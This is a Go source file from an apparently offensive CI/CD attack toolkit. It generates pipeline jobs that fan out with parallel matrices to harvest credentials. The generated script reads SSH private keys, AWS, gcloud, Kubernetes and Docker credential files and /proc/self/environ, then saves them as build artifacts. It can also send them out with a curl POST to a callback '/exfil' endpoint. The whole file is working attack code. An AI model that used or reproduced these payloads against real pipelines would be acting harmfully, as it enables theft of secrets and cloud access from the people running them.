package payloads

import (
	"fmt"
	"sort"
	"strings"
)

// ParallelMatrixOptions configures a parallel matrix combinatorial attack payload.
type ParallelMatrixOptions struct {
	Common      CommonOptions
	MatrixVars  map[string][]string // key → values for combinatorial expansion
	Script      string              // per-iteration command template
	MaxJobs     int                 // cap expansion (default: 50)
	CallbackURL string
}

// GenerateParallelMatrixYAML generates a CI job that spawns parallel instances
// via parallel:matrix for combinatorial credential extraction or brute-force.
func GenerateParallelMatrixYAML(o ParallelMatrixOptions) string {
	name, stage := o.Common.defaults("matrix-sweep")

	if len(o.MatrixVars) == 0 {
		o.MatrixVars = defaultMatrixVars()
	}
	if o.MaxJobs <= 0 {
		o.MaxJobs = 50
	}

	matrixBlock := buildMatrixBlock(o.MatrixVars)
	script := buildMatrixScript(o)

	return fmt.Sprintf(`stages: [%s]

%s:
  stage: %s%s%s
  parallel:
    matrix:
%s
  script:
    - |
%s
  artifacts:
    when: always
    paths:
      - sweep-*.txt
    expire_in: 1 day
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		indentBlock(strings.TrimSpace(matrixBlock), 6),
		indentBlock(strings.TrimSpace(script), 6),
		rulesManual(o.Common.Manual))
}

func defaultMatrixVars() map[string][]string {
	return map[string][]string{
		"TARGET_PATH": {
			"/proc/self/environ",
			"$HOME/.ssh/id_rsa",
			"$HOME/.aws/credentials",
			"$HOME/.config/gcloud/application_default_credentials.json",
			"$HOME/.kube/config",
			"$HOME/.docker/config.json",
		},
		"EXFIL_METHOD": {"artifact", "http"},
	}
}

func buildMatrixBlock(vars map[string][]string) string {
	var b strings.Builder
	b.WriteString("- ")

	keys := make([]string, 0, len(vars))
	for k := range vars {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	for i, k := range keys {
		if i > 0 {
			b.WriteString("  ")
		}
		vals := make([]string, len(vars[k]))
		for j, v := range vars[k] {
			vals[j] = fmt.Sprintf("%q", v)
		}
		fmt.Fprintf(&b, "%s: [%s]\n", k, strings.Join(vals, ", "))
	}

	return b.String()
}

func buildMatrixScript(o ParallelMatrixOptions) string {
	if strings.TrimSpace(o.Script) != "" {
		return o.Script
	}

	var b strings.Builder

	b.WriteString(`_SWEEP() {
  # Per-instance credential sweep using matrix variables
  local outfile="sweep-${CI_NODE_INDEX:-0}.txt"

  # Read target path (expand variables)
  local resolved
  resolved=$(eval echo "$TARGET_PATH" 2>/dev/null) || true
  if [ -f "$resolved" ]; then
    echo "=== $TARGET_PATH ===" >> "$outfile"
    cat "$resolved" >> "$outfile" 2>/dev/null || true
  fi

  # Dump env for this parallel instance via /proc
  echo "=== environ ===" >> "$outfile"
  cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort >> "$outfile" || true
`)

	if strings.TrimSpace(o.CallbackURL) != "" {
		fmt.Fprintf(&b, `
  curl -sS -X POST -F "file=@$outfile" -F "index=$CI_NODE_INDEX" "%s/exfil" || true
`, o.CallbackURL)
	}

	b.WriteString(`}
_SWEEP || true`)

	return b.String()
}
